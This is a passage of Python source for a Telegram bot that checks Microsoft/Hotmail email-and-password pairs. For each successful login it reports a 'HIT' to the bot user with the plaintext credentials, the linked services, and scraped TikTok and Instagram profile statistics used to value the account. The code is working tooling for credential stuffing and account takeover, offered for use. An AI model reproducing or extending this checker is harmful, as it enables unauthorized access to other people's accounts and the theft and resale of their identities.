        token = result.get("token")
        cid = result.get("cid")
        
        services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
        
        elapsed = time.time() - start_time
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        
        # Main result
        success_msg = f"""✅ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> HIT
📝 <b>Result:</b> Login Successful

📱 <b>Linked Services ({len(services) if services else 0}):</b>
{chr(10).join(f'• {s}' for s in services) if services else '❌ None'}

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""
        
        bot.reply_to(message, success_msg, parse_mode='HTML')
        
        # If TikTok found - send detailed info
        if services and "TikTok" in services:
            tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)
            
            if tk_result and tk_result.get('has_tiktok'):
                # Beautiful TikTok format
                tk_username = tk_result.get('username', 'Unknown')
                tk_followers = tk_result.get('followers', 0)
                tk_following = tk_result.get('following', 0)
                tk_likes = tk_result.get('likes', 0)
                tk_videos = tk_result.get('videos', 0)
                tk_verified = tk_result.get('verified', False)
                
                tiktok_msg = f"""╔══════════════════════════════╗
║     ✅ TIKTOK HIT FOUND      ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📧 <b>TikTok Emails:</b> {tk_result.get('tiktok_emails', 0)}

🎵 <b>TIKTOK PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{tk_username}
📛 <b>Name:</b> {tk_username}
🆔 <b>ID:</b> {tk_result.get('user_id', 'N/A')}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {format_number(tk_followers)} ({tk_followers:,})
➕ <b>Following:</b> {format_number(tk_following)} ({tk_following:,})
❤️ <b>Likes:</b> {format_number(tk_likes)} ({tk_likes:,})
📹 <b>Videos:</b> {tk_videos}
👫 <b>Friends:</b> 0

📝 <b>Bio:</b> {tk_result.get('bio', '')}

🔰 <b>Status:</b> {'✅ Verified' if tk_verified else '❌ Not Verified'}
🔒 <b>Private:</b> No
🌍 <b>Country:</b> Unknown 🏳️
📅 <b>Created:</b> Unknown
⏳ <b>Account Age:</b> Unknown

👤 <b>Full Name:</b> {tk_username}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                
                bot.send_message(user_id, tiktok_msg, parse_mode='HTML')
        
        # If Instagram found - send detailed info
        if services and "Instagram" in services:
            ig_username = email.split('@')[0]
            ig_info = get_instagram_full_info(ig_username)
            
            if ig_info:
                flag = get_country_flag(ig_info['country'])
                
                instagram_msg = f"""╔══════════════════════════════╗
║   📸 INSTAGRAM HIT FOUND     ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}

📸 <b>INSTAGRAM PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{ig_info['username']}
📛 <b>Full Name:</b> {ig_info['full_name']}
🆔 <b>User ID:</b> {ig_info['user_id']}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {ig_info['followers']:,}
➕ <b>Following:</b> {ig_info['following']:,}
📸 <b>Posts:</b> {ig_info['posts']}

📝 <b>Bio:</b> {ig_info['bio']}

📅 <b>Join Date:</b> {ig_info['join_date']}
🌍 <b>Country:</b> {ig_info['country']} {flag}

🔰 <b>Status:</b> {'✅ Verified' if ig_info['is_verified'] else '❌ Not Verified'}
🔒 <b>Private:</b> {'Yes' if ig_info['is_private'] else 'No'}
💼 <b>Business:</b> {'Yes' if ig_info['is_business'] else 'No'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                
                bot.send_message(user_id, instagram_msg, parse_mode='HTML')
                
                # Send profile picture
                if ig_info['profile_pic'] != 'N/A':
                    try:
                        bot.send_photo(user_id, ig_info['profile_pic'])
                    except:
                        pass
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

